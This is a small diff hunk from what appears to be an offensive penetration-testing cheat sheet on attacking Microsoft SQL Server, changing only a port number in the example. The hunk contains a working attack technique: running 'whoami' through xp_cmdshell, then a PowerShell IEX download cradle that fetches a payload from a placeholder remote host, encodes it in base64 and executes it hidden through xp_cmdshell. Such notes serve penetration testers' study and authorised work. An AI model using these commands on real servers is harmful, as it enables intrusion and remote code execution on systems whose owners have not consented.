@@ -1883,7 +1883,7 @@ EXEC master..xp_cmdshell 'whoami'
 #### Execute commands trick
 - Prevents having to deal with the escaped, qoutes, double qoutes etc
 ```
-$str = 'IEX ((new-object net.webclient).downloadstring("http://x.x.x.x:8080/payload"))'
+$str = 'IEX ((new-object net.webclient).downloadstring("http://x.x.x.x:8090/payload"))'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
 EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
 ```
